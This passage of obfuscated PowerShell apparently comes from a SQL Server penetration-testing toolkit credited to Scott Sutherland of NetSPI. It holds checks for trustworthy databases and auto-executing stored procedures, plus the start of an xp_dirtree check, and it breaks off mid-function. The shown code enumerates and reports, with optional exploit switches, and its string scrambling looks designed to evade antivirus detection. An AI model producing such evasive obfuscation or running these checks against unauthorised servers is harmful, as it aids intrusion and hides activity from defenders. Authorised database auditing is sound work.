        ${T`EstConNe`C`TiOn} = &("{3}{2}{1}{5}{4}{0}"-f'nTest','t-SQ','e','G','Connectio','L') -Instance ${i`NsTan`ce} -Username ${USe`RNA`ME} -Password ${p`A`SswoRd} -Credential ${CrEde`Nt`iAl} -SuppressVerbose | &("{2}{0}{1}{3}" -f 'here-Ob','jec','W','t') -FilterScript {
            ${_}."St`AT`Us" -eq ("{0}{3}{1}{2}" -f 'Acces','b','le','si')
        }
        if(-not ${testCo`Nn`EctiON})
        {
            
            &("{2}{0}{1}"-f 'e-V','erbose','Writ') -Message ("$Instance "+': '+'CONNE'+'CTI'+'O'+'N '+'FAIL'+'ED.')
            &("{0}{1}{2}"-f 'Wri','te-','Verbose') -Message ("$Instance "+': '+'C'+'OMPL'+'ETED '+'VU'+'LN'+'ERABILIT'+'Y'+' '+'CHEC'+'K:'+' '+'Exce'+'ssiv'+'e '+'Priv'+'ilege'+' '+'- '+'Trust'+'ed'+' '+'D'+'ata'+'base.')
            Return
        }
        else
        {
            &("{0}{1}{3}{2}"-f 'Wr','it','-Verbose','e') -Message ("$Instance "+': '+'C'+'O'+'NNECTI'+'ON '+'SUCC'+'ES'+'S.')
        }

        
        ${S`E`RVErINFo} = &("{4}{3}{5}{1}{0}{2}"-f'ver','er','Info','t','Ge','-SQLS') -Instance ${In`S`T`ANCE} -Username ${uSErn`AME} -Password ${paSs`WO`RD} -Credential ${C`R`EdENti`AL} -SuppressVerbose
        ${cur`RentL`oGiN} = ${Se`Rverin`FO}."CuRREN`T`Log`In"
        ${cOM`Pu`TErNaME} = ${S`eRVeri`N`FO}."CoMputE`R`NA`ME"

        
        
        
        if(${eX`PL`oit})
        {
            ${T`Es`TmodE}  = ("{0}{1}{2}" -f 'Expl','oi','t')
        }
        else
        {
            ${teS`T`MO`DE}  = ("{0}{1}"-f'Au','dit')
        }
        ${VuLn`e`RaB`iLIty} = ("{6}{3}{0}{1}{4}{8}{7}{2}{5}{9}" -f'P','riv','rustworthy','e ','ileg',' D','Excessiv','- T','e ','atabase')
        ${d`EscRip`TiOn}   = ("{7}{89}{0}{35}{3}{21}{50}{104}{10}{51}{32}{102}{75}{33}{82}{86}{90}{92}{57}{40}{80}{69}{59}{61}{15}{64}{97}{41}{28}{71}{38}{78}{46}{6}{77}{70}{49}{36}{79}{20}{91}{17}{103}{88}{1}{101}{4}{66}{13}{45}{29}{68}{9}{98}{81}{18}{63}{24}{37}{73}{14}{23}{84}{8}{42}{76}{95}{34}{22}{65}{58}{31}{39}{48}{96}{56}{87}{26}{27}{43}{16}{53}{74}{12}{85}{19}{25}{94}{55}{60}{47}{99}{11}{67}{44}{62}{100}{93}{30}{5}{52}{54}{83}{72}{2}"-f' ','entially','.',' is ','io','tion','st','One or m','ially','CCE','thy. ','d arbit','ions it can l',' as','Al','er th','th other weak conf','p','F','ad to','Inc','co','d','so, po','o',' us','s','. Co','ce of','h an E','e exec',' to','STWORTHY ','e property is','modules that are ','database','on','n settin',' Server t',' execute as h','icate','an',' mal','mbined wi','r','semblies wit','u','o','igh priv','e c','nfigured as trustw',' The TRU',' on ','igura','th','rsonat','eged use','nd','ed','t','i','h','y ','E permissi','e ','efin','us','ra','XTERNAL_A','whe','th',' SQL',' server','g. ','t','atabas','i','s the database and ','r','tents within it.  ',' ','S or UNSA',' us','e','tent','e','e','r','t','ore','d t','luding ','o i','d','er impe','cious ','il','inst','S','n an','co',' malic','d','o','or')
        ${rEme`dIA`TiOn}   = ((("{39}{24}{18}{55}{62}{25}{52}{34}{64}{9}{2}{10}{58}{19}{20}{40}{35}{22}{26}{29}{43}{12}{0}{33}{44}{6}{46}{61}{21}{42}{53}{8}{23}{37}{60}{48}{16}{45}{11}{28}{32}{1}{59}{49}{54}{27}{56}{15}{63}{3}{30}{38}{7}{14}{57}{47}{41}{13}{4}{36}{31}{17}{5}{50}{51}" -f 'i',' a','datab','ery si','U','FF','ilar to','AM','DATA',' ','ase','sed ',' flag ','T TR','ALT',' A q','USTWORTHY ONyA','Y O','i','so the',' yAMis_tr','T','wor','B','f',' the','thy_on','wort','to se','y','milar to','ORTH','t','s set to yAMfalseyAM.  A','aff','t','STW','ASE MyApps',' y','Con','us',' DATABASE MyAppDb SE','ER','AM',' query sim','M is u',' y','R','SET TR','base as ','y','AM can be use to unset it.',' ',' ','trust','g','hy. ','E',' ',' data','Db ','AMAL','ured','u','ected'))."rE`pLace"(([Char]121+[Char]65+[Char]77),[strING][Char]39))
        ${SeV`e`RItY}      = 'Low'
        ${iSvuL`NerA`B`le}  = 'No'
        ${iS`eXP`LoI`Ta`BlE} = 'No'
        ${EXPl`oit`eD}     = 'No'
        ${E`xp`LOi`TcMd}    = ("{5}{3}{7}{9}{0}{11}{10}{6}{13}{8}{12}{4}{1}{2}"-f' ','s',' time.','ere i','e at thi','Th','it','s','avail',' not','xplo','e','abl',' ')
        ${D`eT`AILs}       = ''
        ${rE`Fe`RenCe}     = ("{6}{11}{14}{2}{8}{1}{0}{7}{12}{9}{13}{4}{10}{15}{3}{5}"-f 'o','icros','//m','.a','87','spx','h','ft.com/en-us/lib','sdn.m','/','86','tt','rary','ms1','ps:','1')
        ${au`THOr}        = ("{4}{6}{5}{2}{3}{10}{8}{1}{9}{0}{12}{11}{7}" -f 'nd',' (@_nul','he','r','Sc','t','ott Su','SPI 2016','d','lbi','lan',' Net','),')

        
        
        
        

        
        ${T`Rus`TEdDAT`A`Ba`SES} = &("{1}{2}{3}{0}"-f'e','Ge','t-S','QLDatabas') -Instance ${INs`T`ANCE} -Username ${USErn`A`me} -Password ${P`Ass`woRD} -Credential ${C`REdEnt`IAl} -SuppressVerbose | &("{0}{2}{1}"-f 'Wher','ject','e-Ob') -FilterScript {
            ${_}."dATa`BASE`Na`me" -ne ("{0}{1}"-f'ms','db') -and ${_}."iS_T`R`Ust`wOR`T`HY_ON" -eq ("{1}{0}"-f 'e','Tru')
        }

        
        if(${tru`ST`EddaTAB`Ases})
        {
            ${Is`VUlNEr`ABLE}  = 'Yes'
            ${truS`TeDd`A`T`Aba`sES} |
            &("{2}{3}{1}{4}{0}" -f'ect','ch-Ob','ForE','a','j') -Process {
                ${dA`TABASeN`A`Me} = ${_}."d`ATAbASen`Ame"

                &("{0}{3}{1}{2}" -f'W','er','bose','rite-V') -Message ("$Instance "+': '+'- '+'T'+'he '+'data'+'base'+' '+"$DatabaseName "+'was'+' '+'foun'+'d'+' '+'config'+'ured'+' '+'as'+' '+'t'+'rus'+'tworthy.')
                ${De`TAI`lS} = ('Th'+'e '+'da'+'tab'+'ase '+"$DatabaseName "+'wa'+'s '+'foun'+'d '+'co'+'nfi'+'gured '+'as'+' '+'trustwort'+'h'+'y.')
                ${N`ULL} = ${T`BlDa`TA}."rO`WS".("{1}{0}"-f 'dd','A').Invoke(${COMPU`T`ER`N`AmE}, ${i`NsT`A`NCE}, ${V`Ul`NeRA`BI`LiTy}, ${d`EScr`i`pTioN}, ${rEm`EDiA`TioN}, ${s`evERitY}, ${Is`VUL`NeRABlE}, ${i`sex`pLO`iTAble}, ${exp`L`OI`TEd}, ${eXplo`iTc`Md}, ${De`T`AIlS}, ${r`efEre`NCE}, ${AU`T`HOr})
            }
        }
        else
        {
            &("{2}{3}{1}{0}" -f 'erbose','-V','W','rite') -Message ("$Instance "+': '+'- '+'No'+' '+'n'+'o'+'n-default '+'t'+'rusted '+'databa'+'s'+'es'+' '+'wer'+'e '+'fou'+'nd.')
        }

        
        
        
        
        
        


        
        
        
        
        
        
        


        
        &("{1}{2}{0}"-f'se','Write','-Verbo') -Message ("$Instance "+': '+'COM'+'PL'+'ET'+'ED '+'VULNER'+'A'+'BILITY '+'CHEC'+'K'+': '+'Exce'+'ssive'+' '+'Pri'+'v'+'ilege '+'- '+'Truste'+'d '+'D'+'at'+'abase')
    }

    End
    {
        
        if ( -not ${N`OoUT`PUT})
        {
            Return ${t`BLD`AtA}
        }
    }
}






Function  iNvok`E-sqlAud`ITPrI`VA`UToEXEC`Sp
{
    
    [CmdletBinding()]
    Param(
        [Parameter(mAnDatOrY = ${Fa`l`sE},
                VALUeFROMpiPELinEbypropERTyNaME = ${t`RUe},
        hELpmesSage = {"{9}{7}{1}{4}{8}{6}{10}{2}{5}{3}{0}"-f'ith.','Server','icat','w',' or do','e ',' account to aut','QL ','main','S','hent'})]
        [string]${uSErN`Ame},

        [Parameter(MAnDatory = ${fa`L`Se},
                vaLuEFroMPIPeliNebyPROpeRtYNAMe = ${T`RUE},
        heLpmessAGe = {"{4}{11}{7}{5}{6}{0}{9}{1}{2}{8}{3}{10}"-f'n','ount password to',' au','cat','S','ver or d','omai','L Ser','thenti',' acc','e with.','Q'})]
        [string]${PaSs`w`Ord},

        [Parameter(MAnDaTORy = ${f`ALse},
                VaLuEfROmpiPeLIneByPRoPERTynAmE = ${t`Rue},
        helPmeSsaGE = {"{0}{1}{2}{3}" -f'W','indow','s',' credentials.'})]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]${Cr`e`D`eNTial} =   ( GeT-cHiLdITeM  ("vAR"+"I"+"AbLE:0459m"+"2")  ).Value::"E`mPtY",

        [Parameter(ManDAtoRy = ${fAl`se},
                VaLuefROmpIPeLiNeByPROpErTYNAme = ${T`Rue},
        heLpMESSAge = {"{1}{4}{3}{9}{5}{0}{2}{10}{6}{8}{7}"-f 'c','SQL Serv','o','n','er insta','e to ','o','to.','n ','c','nnecti'})]
        [string]${Ins`TA`Nce},

        [Parameter(maNdAtoRy = ${FaL`sE},
        hELpmESsAGe = {(("{3}{2}{5}{4}{0}{1}"-f'in','g.','st out','DonhN','h','put anyt'))  -CREPlACE  ([chAr]104+[chAr]78+[chAr]115),[chAr]39})]
        [string]${noOut`P`UT},

        [Parameter(MandATORY = ${f`A`Lse},
        helPMEssAGe = {"{4}{3}{1}{0}{2}"-f'lnerable','t vu',' issues.','xploi','E'})]
        [switch]${e`X`PLoIT}
    )

    Begin
    {
        
        ${tB`LAUTOExe`cPr`i`Vs} = &("{1}{0}{3}{2}" -f'ew-o','n','ject','b') ("{4}{2}{1}{3}{0}"-f 'le','tem.Data.D','ys','ataTab','S') 
        ${tBlAUTO`exE`c`pR`IvS}."co`luMnS".("{0}{1}"-f'a','dd').Invoke(("{2}{1}{0}" -f'e','am','ComputerN')) | &("{0}{1}{2}"-f'Out-','Nu','ll')
        ${T`BLaut`OExEcPR`I`VS}."C`olu`mNS".("{1}{0}" -f 'dd','a').Invoke(("{2}{1}{0}" -f'nce','nsta','I')) | &("{2}{1}{0}" -f'Null','ut-','O')
        ${t`B`l`A`U`ToEXecpRIVs}."c`Ol`UmnS".("{1}{0}" -f'dd','a').Invoke(("{3}{1}{0}{2}"-f'm','baseNa','e','Data')) | &("{1}{0}{2}" -f'N','Out-','ull')
        ${TblA`U`TOe`xECPRi`Vs}."c`OlUmNs".("{0}{1}"-f'a','dd').Invoke(("{2}{1}{3}{0}"-f 'ame','che','S','maN')) | &("{0}{2}{1}"-f'Ou','ull','t-N')
        ${TBL`Au`T`Oe`xEcpRivs}."COl`U`mns".("{1}{0}"-f'dd','a').Invoke(("{0}{3}{2}{1}" -f 'P','reName','du','roce')) | &("{2}{1}{0}"-f 'l','t-Nul','Ou')
        ${TB`LAU`TOEX`E`c`PRIVS}."Co`lu`MNs".("{0}{1}" -f 'a','dd').Invoke(("{1}{2}{0}" -f 'pe','Procedure','Ty')) | &("{0}{1}"-f 'Out-','Null')
        ${TbLa`UTO`eXe`CprivS}."c`O`LuMnS".("{1}{0}"-f'dd','a').Invoke(("{1}{2}{3}{4}{0}"-f'on','Pro','ce','dureDef','initi')) | &("{1}{0}{2}" -f'ut-Nul','O','l')
        ${t`BlaUToExEc`p`R`ivS}."c`Olumns".("{0}{1}"-f'a','dd').Invoke(("{3}{2}{0}{4}{1}"-f'_DA','ESS','QL','S','TA_ACC')) | &("{0}{1}" -f'Ou','t-Null')
        ${TB`l`AU`TOexEc`pRivS}."C`Olu`mNs".("{1}{0}"-f'd','ad').Invoke(("{3}{2}{0}{1}" -f 'BO','DY','NE_','ROUTI')) | &("{0}{2}{1}" -f 'Out-Nu','l','l')    
        ${TbLA`Ut`Oe`XecpRi`Vs}."colu`M`NS".("{1}{0}"-f 'd','ad').Invoke(("{2}{0}{1}"-f 'E','D','CREAT')) | &("{1}{2}{0}"-f'Null','Ou','t-')         
        ${tb`lauto`E`XECpri`Vs}."Co`luMnS".("{0}{1}"-f 'ad','d').Invoke(("{2}{1}{3}{0}"-f'TERED','ST_','LA','AL')) | &("{0}{2}{1}" -f'O','ll','ut-Nu')    
        ${T`BL`A`UtO`exECpRIvs}."CoLu`MNs".("{0}{1}" -f'ad','d').Invoke(("{0}{2}{1}"-f 'is_ms','ed','_shipp')) | &("{1}{2}{0}" -f 'ull','Out-','N')   
        ${TBL`A`UToEXecP`RIvs}."Co`l`UmNS".("{1}{0}" -f'dd','a').Invoke(("{3}{0}{2}{1}{4}" -f'uto_','cut','exe','is_a','ed')) | &("{0}{1}"-f'Out-','Null') 
        ${T`BLAUt`o`eXec`PrivS}."ColuM`NS".("{1}{0}"-f 'dd','a').Invoke(("{1}{2}{0}"-f'me','PrincipalN','a')) | &("{1}{0}{2}"-f'ut-Nul','O','l')
        ${Tb`l`AU`ToexEcp`RiVs}."COl`UM`Ns".("{1}{0}" -f'd','ad').Invoke(("{1}{3}{2}{0}{4}"-f'Typ','P','cipal','rin','e')) | &("{2}{1}{0}"-f 'Null','ut-','O')
        ${tBl`A`UT`oeX`ecpri`VS}."COLum`Ns".("{1}{0}"-f 'd','ad').Invoke(("{3}{0}{2}{1}" -f 'ssion','me','Na','Permi')) | &("{1}{2}{0}"-f 'l','Out','-Nul')
        ${tBl`Aut`oe`xec`PRI`Vs}."ColUm`Ns".("{0}{1}" -f'a','dd').Invoke(("{2}{0}{3}{1}"-f 'ermi','onType','P','ssi')) | &("{2}{0}{1}"-f 'ut-N','ull','O')
        ${TbLauTo`eXEC`Pr`I`Vs}."cOl`UMnS".("{0}{1}" -f 'a','dd').Invoke(("{3}{2}{1}{0}"-f 'ption','Descri','tate','S')) | &("{1}{2}{0}"-f'l','Ou','t-Nul')
        ${t`BlAUTOExeC`pR`I`Vs}."col`UM`NS".("{1}{0}" -f 'd','ad').Invoke(("{2}{0}{1}"-f 'bject','Name','O')) | &("{0}{1}{2}" -f'Out-','Nul','l')
        ${tb`l`AU`TOeX`E`cPRIvs}."COlu`M`Ns".("{1}{0}"-f 'dd','a').Invoke(("{2}{1}{0}"-f'ype','bjectT','O')) | &("{2}{0}{1}"-f'ut','-Null','O')

        
        ${T`BLDaTa} = &("{0}{3}{2}{1}"-f 'Ne','t','jec','w-Ob') -TypeName ("{0}{3}{4}{1}{2}{6}{5}"-f 'Sy','ta.D','at','stem.D','a','e','aTabl')
        ${NU`Ll} = ${tBLD`ATa}."col`U`mNs".("{0}{1}" -f'Ad','d').Invoke(("{3}{0}{2}{1}" -f 'p','e','uterNam','Com'))
        ${N`UlL} = ${TBLD`A`TA}."CO`lUMNs".("{0}{1}"-f 'Ad','d').Invoke(("{1}{0}" -f'stance','In'))
        ${n`Ull} = ${tBLD`ATa}."ColU`Mns".("{0}{1}" -f 'A','dd').Invoke(("{3}{2}{0}{1}"-f'i','lity','ulnerab','V'))
        ${n`Ull} = ${TbLD`Ata}."ColuM`Ns".("{0}{1}"-f'Ad','d').Invoke(("{0}{1}{2}"-f'Descr','ipt','ion'))
        ${NU`ll} = ${Tbl`D`Ata}."cOlUm`NS".("{0}{1}"-f 'Ad','d').Invoke(("{2}{1}{0}" -f'iation','med','Re'))
        ${Nu`Ll} = ${t`B`ldaTa}."COL`U`mNs".("{1}{0}" -f 'd','Ad').Invoke(("{2}{1}{0}" -f'y','everit','S'))
        ${N`ULL} = ${t`BL`dATA}."CoL`Um`Ns".("{0}{1}"-f'A','dd').Invoke(("{3}{2}{0}{1}" -f 'abl','e','er','IsVuln'))
        ${N`ULl} = ${tB`lD`Ata}."C`Olu`MnS".("{0}{1}"-f 'A','dd').Invoke(("{0}{1}{3}{2}" -f'IsEx','p','itable','lo'))
        ${N`UlL} = ${Tb`LData}."Co`l`UmNs".("{1}{0}"-f'd','Ad').Invoke(("{0}{1}{2}"-f 'Exp','l','oited'))
        ${nu`Ll} = ${tbl`D`Ata}."C`oL`UMnS".("{1}{0}" -f 'd','Ad').Invoke(("{1}{2}{0}"-f 'md','Exp','loitC'))
        ${nu`lL} = ${tb`LDa`Ta}."co`LUMnS".("{0}{1}" -f 'A','dd').Invoke(("{1}{2}{0}"-f's','Det','ail'))
        ${nU`LL} = ${tbl`d`Ata}."C`oLUm`Ns".("{0}{1}" -f'A','dd').Invoke(("{2}{0}{3}{1}"-f'efer','ce','R','en'))
        ${nu`ll} = ${Tb`lda`Ta}."COlUm`Ns".("{1}{0}"-f'dd','A').Invoke(("{0}{1}" -f 'Autho','r'))
    }

    Process
    {
        
        &("{0}{1}{2}" -f'Writ','e-V','erbose') -Message ("$Instance "+': '+'STAR'+'T'+' '+'VUL'+'NERAB'+'ILIT'+'Y '+'CHECK:'+' '+'Ex'+'cessiv'+'e '+'Priv'+'ileg'+'e '+'- '+'Aut'+'o '+'Ex'+'e'+'cute '+'Store'+'d'+' '+'Pr'+'oced'+'ure')

        
        ${T`EstCoNNec`TIoN} = &("{6}{4}{5}{2}{3}{0}{1}"-f'T','est','t','ion','SQL','Connec','Get-') -Instance ${I`NSTA`NcE} -Username ${UseR`NaMe} -Password ${P`Ass`worD} -Credential ${cr`EdenT`iAL} -SuppressVerbose | &("{1}{0}{2}" -f 'ere','Wh','-Object') -FilterScript {
            ${_}."sTaT`Us" -eq ("{0}{1}{2}"-f'A','ccessib','le')
        }
        if(-not ${tes`T`CO`NnEct`IOn})
        {
            
            &("{0}{1}{2}"-f 'Write-Ver','b','ose') -Message ("$Instance "+': '+'CO'+'NNECTI'+'ON '+'FAIL'+'ED.')
            &("{1}{0}{2}"-f 'rb','Write-Ve','ose') -Message ("$Instance "+': '+'COM'+'PLETE'+'D '+'VULNE'+'R'+'ABILIT'+'Y'+' '+'CH'+'E'+'CK: '+'E'+'xces'+'si'+'ve '+'Pri'+'v'+'ilege'+' '+'- '+'A'+'uto '+'Exec'+'ute '+'Sto'+'re'+'d '+'Proc'+'e'+'dure.')
            Return
        }

        
        ${SeRV`eRI`N`FO} = &("{1}{2}{3}{4}{0}"-f'fo','Get-','SQLServe','r','In') -Instance ${I`N`s`TaNce} -Username ${US`ERNaMe} -Password ${PASsW`Ord} -Credential ${CrEd`EnT`i`Al} -SuppressVerbose
        ${cuRr`ent`L`o`GIn} = ${s`E`R`VERInfo}."cuRR`eNt`LOgiN"
        ${coMPuTE`RNA`ME} = ${SE`RVE`RiNfO}."c`OM`pUterName"

        
        
        
        if(${eXpl`O`It})
        {
            ${tEST`Mo`DE}  = ("{0}{1}"-f'E','xploit')
        }
        else
        {
            ${Te`S`Tm`odE}  = ("{1}{0}"-f 'it','Aud')
        }
        ${V`U`LneRAb`ility} = ("{8}{2}{3}{1}{6}{10}{0}{5}{11}{4}{9}{7}"-f'o E','i','e ','Pr','re','x','vilege - ','ocedure','Excessiv','d Pr','Aut','ecute Sto')
        ${DesCRi`P`T`iON}   = ((("{35}{19}{22}{36}{28}{9}{7}{37}{31}{39}{3}{41}{11}{16}{8}{26}{29}{13}{32}{0}{10}{1}{14}{15}{34}{17}{27}{20}{30}{18}{25}{2}{33}{40}{42}{24}{6}{38}{12}{5}{21}{23}{4}"-f 'This m',' sy',' when th','on a','ed.','t','e ','au','i','r ','ay allow non','s exp','s','s','sadmin logins',' ','licit perm','o','ies as ','t','cute qu','a','ore','rt','rver servic','6QMsa6QM','s',' exe','ocedured is configured fo','sions a','er','m','signed.  ','e','t','A s','d pr','to','is re','atic executi',' SQL ','nd ha','Se')) -REPlacE  ([cHar]54+[cHar]81+[cHar]77),[cHar]34)
        ${R`EME`D`IaTiOn}   = ("{24}{26}{31}{5}{6}{28}{11}{10}{9}{20}{21}{3}{1}{30}{12}{14}{22}{29}{13}{23}{15}{8}{25}{18}{16}{7}{0}{2}{19}{27}{17}{4}{32}" -f 't','ha','ed s','t ',' ','h','at non s','cu','th','gins do','n lo','sadmi','ER','s',' stored','configured with ','xe','t',' is_auto_e','ettting s',' n','o',' proced',' ','E','e','nsure','e','y','ure','ve privileges to ALT',' t','to 1.')
        ${SEv`e`Ri`Ty}      = 'Low'
        ${isV`U`lNeRA`BlE}  = 'No'
        ${i`sEX`Pl`oITaBLE} = 'No'
        ${EXpLO`It`ed}     = 'No'
        ${Ex`plo`it`cMd}    = ("{8}{10}{6}{0}{4}{7}{9}{3}{2}{5}{1}"-f 't ava','me.','s t','i','ilable at ','i','i','t','There is not','h',' explo')
        ${deTA`i`lS}       = ''
        ${R`eF`E`REnCe}     = ("{8}{6}{3}{4}{0}{1}{7}{9}{5}{2}" -f 'om/en-us/li','bra','px','.','microsoft.c','as','dn','ry/m','https://ms','s187861.')
        ${au`TH`OR}        = ("{5}{7}{0}{2}{1}{3}{9}{8}{4}{6}" -f'ott Suthe','land (@_n','r','ull','01','S','6','c','tSPI 2','bind), Ne')

        
        
        
        
        ${i`svU`lneR`A`BlE}  = 'Yes'

        
        ${aut`o`procS} = &("{2}{0}{1}{3}{4}{6}{5}{7}" -f'r','o','Get-SQLStoredP','cedu','reAut','Exe','o','c') -Verbose -Instance ${iNsT`ANcE} -Username ${u`SErN`AME} -Password ${PasSW`o`Rd} -Credential ${CRed`EnTi`Al} 

        
        ${Au`To`counT} = ${auTO`p`ROCS} | &("{2}{1}{0}"-f'e','ur','meas') | &("{0}{2}{1}"-f 'sele','t','c') ("{0}{1}"-f'co','unt') -ExpandProperty ("{0}{1}" -f'co','unt')

        if(${AUtOco`U`Nt} -eq 0){
            &("{1}{4}{0}{3}{2}"-f'rb','Wr','e','os','ite-Ve') ("$Instance "+': '+'N'+'o '+'s'+'tored'+' '+'pro'+'ced'+'ures '+'wer'+'e '+'f'+'o'+'und '+'config'+'ured'+' '+'to'+' '+'au'+'to '+'execute'+'.')
            return
        }

        
        &("{1}{2}{3}{0}"-f'e','W','rite-V','erbos') ("$Instance "+': '+'Ch'+'eck'+'ing '+'p'+'ermissi'+'ons...')
        ${A`UT`Oprocs} | 
        &("{0}{1}{2}"-f 'for','each-','object') {
    
            
            ${c`o`M`Pu`TernAMe} = ${_}."cO`Mp`Uterna`ME"
            ${iNs`Ta`NCe} = ${_}."I`Nstan`Ce"
            ${DAtA`B`AS`EnaME} = ${_}."daTa`BaSe`Na`ME"
            ${ScHE`MA`NamE} = ${_}."ScH`EM`AnAme"
            ${prOc`edUrE`N`AmE} = ${_}."PR`OCeduR`e`NA`Me"
            ${Proce`d`UR`eTY`Pe} = ${_}."proC`eDuRety`Pe"
            ${pROCed`URe`DEFI`NitIon} = ${_}."pROcEDUR`E`De`FinIti`ON"
            ${S`Ql_`dAtA`_aCCESS} = ${_}."S`Ql_DA`Ta_acCe`ss"
            ${r`out`Ine_`BOdY} = ${_}."routIN`E`_`BOdY"
            ${crE`A`TED} = ${_}."cReAT`ED"
            ${L`AS`T_A`LT`erEd} = ${_}."LaSt_aL`T`ErED"
            ${is_ms_S`HIp`PeD} = ${_}."IS_mS_`Sh`iPPED"
            ${iS_AU`T`o_e`XecUTeD} = ${_}."i`s_`A`UTO_exeCUT`Ed"    

            
	        ${Resu`l`TS} = &("{0}{1}{2}{3}{5}{4}" -f 'G','et-SQ','LDat','ab','v','asePri') -Verbose -DatabaseName ("{0}{1}" -f'mast','er') -SuppressVerbose -Instance ${iNs`T`ANce} -Username ${uSe`RN`AmE} -Password ${P`AS`sWoRd} -Credential ${cr`Ed`ENt`IAL} | 
            &("{1}{0}{2}" -f 'er','Wh','e-Object') {${_}."obJeC`T`NAME" -like "$ProcedureName"}

            
            ${P`ERmcO`UnT} = ${R`E`SulTs} | &("{1}{0}" -f 'e','measur') | &("{1}{0}" -f'ect','sel') ("{1}{0}" -f 'nt','cou') -ExpandProperty ("{0}{1}"-f 'cou','nt')

            
            if(${p`Ermco`Unt} -ge 1){

                
                ${R`Es`ULTS} | 
                &("{0}{2}{3}{1}" -f'ForEach-','ct','O','bje') {

                    
                    ${p`Ri`NCiPalnAME} = ${_}."pRINCi`PaLn`AmE"
                    ${pR`IN`Ci`palTy`Pe} = ${_}."pri`NcIPAl`T`yPE"
                    ${perMI`SSiON`N`Ame} = ${_}."Pe`R`MIS`s`IONNAME"
                    ${pErmiSs`IO`NTYpe} = ${_}."p`erMIS`si`ONTYpe"
                    ${sT`AT`E`DeScRipTi`on} = ${_}."STATede`sC`RI`ptION"
                    ${ob`JEC`TTY`PE} = ${_}."o`B`JeC`TTyPe"
                    ${obj`eCTNa`me} = ${_}."O`BJECT`NAME"

                    ${ful`lSP`Na`me} = "$DatabaseName.$SchemaName.$ProcedureName"
        
                    
                    ${tblaUTO`ex`eCpr`I`VS}."Ro`Ws".("{0}{1}"-f'Ad','d').Invoke(
                        ${COmPuT`eRna`ME},
                        ${insTa`NCE},
                        ${D`ATA`BAse`NAmE},
                        ${sCH`E`MaNA`ME},
                        ${Pr`ocEdu`RE`NaME},
                        ${pRo`ce`DuretYpe},
                        ${Pr`OcEDUre`dEFIn`iT`i`on},
                        ${sqL_d`A`TA_`AcceSs},
                        ${ROUTI`N`e_bo`DY},
                        ${cr`eA`TEd},
                        ${LAS`T_AL`TerED},
                        ${iS_ms_sH`IP`Ped},
                        ${is_`Aut`O_E`Xec`UtEd},
                        ${p`Ri`NcIPaln`AME},
                        ${PRInCipA`lt`yPe},
                        ${peRmIsS`io`N`N`Ame},
                        ${P`ErMI`SsIOnTYpE},
                        ${Sta`Te`Descr`IP`TIoN},
                        ${O`BJECTn`A`Me},
                        ${OBJeCtT`y`PE}
                    ) | &("{2}{1}{0}" -f'll','t-Nu','Ou')

                    &("{2}{3}{0}{1}" -f 'e-Verbos','e','W','rit') -Message ("$Instance "+': '+'- '+"$PrincipalName "+'ha'+'s '+"$StateDescription "+"$PermissionName "+'o'+'n '+"$FullSpName.")
                    ${DeT`Ails} = ("$PrincipalName "+'has'+' '+"$StateDescription "+"$PermissionName "+'on'+' '+"$FullSpName.")
                    ${nu`ll} = ${TBLd`A`TA}."R`ows".("{0}{1}" -f 'Ad','d').Invoke(${Comp`U`Te`RN`AME}, ${I`NSTAnCe}, ${V`ULNER`A`Bility}, ${d`EsCri`ptIOn}, ${RE`meDia`TiOn}, ${SeV`e`RItY}, ${iS`V`UL`NERabLE}, ${Is`e`xPloiTA`B`Le}, ${e`xPLo`iTEd}, ${E`xPLO`i`TCmD}, ${deT`A`iLS}, ${rEfere`N`CE}, ${auT`hor})            
                }
            }
        }

        

        
        
        
        
        
        
        ${IS`eXp`lo`ITablE} = ("{1}{2}{0}"-f 'known','U','n')

        
        
        
        
        
        
        


        
        &("{0}{3}{1}{2}" -f 'Writ','Verb','ose','e-') -Message ("$Instance "+': '+'C'+'OMP'+'LETED '+'VULN'+'ERABILI'+'TY'+' '+'CH'+'EC'+'K: '+'E'+'xcessi'+'ve'+' '+'Privi'+'le'+'ge '+'- '+'Trust'+'ed'+' '+'D'+'a'+'tabase')
    }

    End
    {
        
        if ( -not ${nooUT`put})
        {
            Return ${t`BLd`Ata}
        }
    }
}






Function I`NV`O`K`E-sQLAuditPRIvxpd`I`RtrEE
{
    
    [CmdletBinding()]
    Param(
        [Parameter(maNDATOry = ${fA`LSE},
                VaLueFroMPIpELIneBYPROpERTynamE = ${t`Rue},
        hElpMeSsAGe = {"{8}{11}{2}{7}{10}{4}{9}{6}{1}{5}{3}{0}{12}" -f 'e wit','nt',' or','cat','cc','i','e',' doma','SQL ','ount to auth','in a','Server','h.'})]
        [string]${uS`Ern`AMe},

        [Parameter(MandAtORy = ${F`ALSE},
                vaLUEFromPiPELINebypRopErTYnAme = ${T`RUe},
        helpmESsAGE = {"{2}{6}{7}{8}{0}{4}{10}{9}{12}{5}{11}{1}{3}" -f'cc','o a','SQL S','uthenticate with.','ou','d','erver or do','mai','n a','s','nt pa',' t','swor'})]
        [string]${pas`swoRd},

        [Parameter(MAnDAtoRy = ${F`A`LsE},
                VaLuefROmpiPeLInEBYProPErtyName = ${Tr`UE},
        hElpMESsaGE = {"{3}{2}{0}{1}{4}" -f ' c','redential','ndows','Wi','s.'})]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]${cr`EDEN`Ti`Al} =   ( itEM vaRIABLE:0459M2).vaLue::"EMP`Ty",

        [Parameter(MaNDaTory = ${FA`LSE},
                vAluefROMPipELINeByprOpErTyNaME = ${tr`Ue},
        heLPMeSSAGe = {"{5}{4}{2}{3}{1}{0}{7}{6}"-f 'n','co','sta','nce to ','Server in','SQL ','ection to.','n'})]
        [string]${ins`TANCE},

        [Parameter(mANdAtoRy = ${F`A`lSE},
        HElPMESSaGe = {(("{0}{2}{5}{3}{4}{1}"-f'Don','.','Krqt output any','hi','ng','t'))-crePlaCE  ([ChAR]75+[ChAR]114+[ChAR]113),[ChAR]39})]
        [string]${no`o`UTpuT},

        [Parameter(MANDatOrY = ${faL`sE},
        HelpmeSsaGE = {"{6}{2}{7}{0}{8}{4}{5}{1}{3}"-f 'vuln','u','ploi','es.','ra','ble iss','Ex','t ','e'})]
        [switch]${E`xp`lOit},

        [Parameter(MaNDAtoRy = ${f`AL`sE},
